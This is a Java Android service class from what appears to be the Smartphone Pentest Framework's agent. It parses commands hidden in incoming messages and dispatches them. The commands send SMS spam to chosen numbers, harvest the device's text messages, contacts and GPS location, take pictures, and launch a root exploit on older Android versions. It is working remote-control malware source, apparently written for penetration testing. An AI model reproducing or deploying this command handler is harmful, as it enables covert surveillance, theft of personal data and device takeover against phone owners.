package com.bulbsecurity.framework;


import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;
import android.widget.Toast;

public class CommandHandler extends Service {

	@Override
	public void onCreate() {
		// TODO Auto-generated method stub
		
	}
	
	@Override
	public void onStart(Intent intent, int startID) {
		Log.i("AAA", "Started handler");		 
		String spam = "SPAM";
		String smss = "SMSS";
		String cont = "CONT";
		String pict = "PICT";
		String root = "ROOT";
		String gps = "GGPS";
		String attach = "ATTA";
		String body = intent.getStringExtra("message");
		
		if (body.length() >= 12)
		{
			
			String checkfunction = body.substring(8,12);
			if (checkfunction.equals(spam))
			{
				String aString[] = body.split(" ");
				if (aString.length >= 4)
				{
					String number = aString[2];
					String message = aString[3];
					for (int j = 4; j < aString.length; j++)
					{
						message += " ";
						message += aString[j];
					}
					Intent intent2 = new Intent(getApplicationContext(),SMSService.class);
					intent2.putExtra("number",number);
					intent2.putExtra("message",message);
					Context context = getApplicationContext();
					context.startService(intent2);
					
					
				}

				
			}
			
			else if (checkfunction.equals(attach)) {
	
					Intent intent4 = new Intent(getApplicationContext(), Checkin.class);
					Context context3 = getApplicationContext();
					context3.startService(intent4);
				
			
			}
			
			else if (checkfunction.equals(smss)) {
				String aString[] = body.split(" ");
				if (aString.length >= 3)
				{
					String ret = aString[2];
					Intent intent4 = new Intent(getApplicationContext(), SMSGet.class);
					intent4.putExtra("returnmethod",ret);
					Context context3 = getApplicationContext();
					context3.startService(intent4);
				}
			
			}
			else if (checkfunction.equals(gps)) {				 
				String aString[] = body.split(" ");
				if (aString.length >= 3)
				{
					String ret = aString[2];
					Intent intent4 = new Intent(getApplicationContext(), GetGPS.class);
					intent4.putExtra("returnmethod",ret);
					Context context3 = getApplicationContext();
					context3.startService(intent4);
				}
			
			}
			else if (checkfunction.equals(cont)) {
				String aString[] = body.split(" ");
				if (aString.length >= 3)
				{
					String ret = aString[2];
					Intent intent4 = new Intent(getApplicationContext(),ContactsGet.class);
					intent4.putExtra("returnmethod",ret);
					Context context3 = getApplicationContext();
					context3.startService(intent4);
				}
			}
			

			else if (checkfunction.equals(pict)) {
				String returnvalue = null;
				Intent intent4 = new Intent(getApplicationContext(), PictureService.class);
				intent4.putExtra("returnvalue",returnvalue);
				Context context4 = getApplicationContext();
				context4.startService(intent4);
				
			}
			
			else if (checkfunction.equals(root)){
				int rooted = ((AndroidAgent)this.getApplication()).getrooted();
				if (rooted == 0)
				{
				 ((AndroidAgent)this.getApplication()).setrooted(1);
				 int rooted2 = ((AndroidAgent)this.getApplication()).getrooted();
				 Log.i("RRR", String.valueOf(rooted2));
						if (Build.VERSION.SDK_INT < 9)
						{
							Intent intent9 = new Intent(getApplicationContext(), Phase1.class);
							Context context4 = getApplicationContext();
							context4.startService(intent9);
						}
				}
			}
			
		}
			
		
				
		
	}
	
	@Override
	public void onDestroy() {
		
	}
	
	@Override
	public IBinder onBind(Intent intent) {
		// TODO Auto-generated method stub
		return null;
	}

}
